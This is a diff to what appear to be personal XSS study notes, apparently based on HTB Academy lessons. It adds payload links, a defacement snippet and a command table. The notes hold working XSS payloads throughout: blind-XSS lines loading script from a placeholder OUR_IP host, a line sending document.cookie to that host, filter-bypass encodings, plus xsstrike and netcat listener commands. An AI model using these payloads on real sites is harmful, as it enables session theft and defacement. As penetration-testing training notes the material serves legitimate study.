@@ -24,7 +24,9 @@
   - Try leaving off closing bracket
 - [ ] Check content-type
 
-> [!tip] This is particularly important for API endpoints
+> [!tip] 
+> 
+> This is particularly important for API endpoints
 >
 > If the content type doesn't match what is actually returned (e.g., text/html with JSON returned from an API), try accessing the endpoint directly and see if HTML injection is possible.
 
@@ -125,6 +127,9 @@ Additionally, there's nothing to indicate that the `ctfio.com` is the end of the
 
 ## Payloads
 
+- https://github.com/payload-box/xss-payload-list
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
+
 ### Building Requests
 
 ```jsx
@@ -222,6 +227,14 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ?>
 ```
 
+### Defacement
+
+```html
+<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
+```
+
+
+
 ## DOM-Based XSS
 
 ### Common Sources (where attacker-controlled data enters)
@@ -255,18 +268,23 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 
 ## Blind XSS
 
-Sample payloads
+Sample payloads - From HTB
 
 ```html
 <script src=http://OUR_IP></script>
+
 '><script src=http://OUR_IP></script>
+
 "><script src=http://OUR_IP></script>
+
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+
 <script>$.getScript("http://OUR_IP")</script>
 ```
 
-Cookie Stealer
+Cookie Stealer - From HTB
 
 ```php
 <?php
@@ -293,6 +311,27 @@ if (isset($_GET['c'])) {
 | Quotes blocked        | `String.fromCharCode(88,83,83)`, `/string/.source`                              |
 | Spaces blocked        | `/**/`, `/`, `%09`, `%0a`, `%0d`                                                |
 | `javascript:` blocked | `java%0ascript:`, `\x6Aavascript:`, `javascript&colon;`                         |
+
+## Commands
+
+| Code                                                                                          | Description                       |
+| --------------------------------------------------------------------------------------------- | --------------------------------- |
+| **XSS Payloads**                                                                              |                                   |
+| `<script>alert(window.origin)</script>`                                                       | Basic XSS Payload                 |
+| `<plaintext>`                                                                                 | Basic XSS Payload                 |
+| `<script>print()</script>`                                                                    | Basic XSS Payload                 |
+| `<img src="" onerror=alert(window.origin)>`                                                   | HTML-based XSS Payload            |
+| `<script>document.body.style.background = "#141d2b"</script>`                                 | Change Background Color           |
+| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image           |
+| `<script>document.title = 'HackTheBox Academy'</script>`                                      | Change Website Title              |
+| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`                | Overwrite website's main body     |
+| `<script>document.getElementById('urlform').remove();</script>`                               | Remove certain HTML element       |
+| `<script src="http://OUR_IP/script.js"></script>`                                             | Load remote script                |
+| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`               | Send Cookie details to us         |
+| **Commands**                                                                                  |                                   |
+| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                           | Run `xsstrike` on a url parameter |
+| `sudo nc -lvnp 80`                                                                            | Start `netcat` listener           |
+|`sudo php -S 0.0.0.0:80`|Start `PHP` server|
 
 ---
 
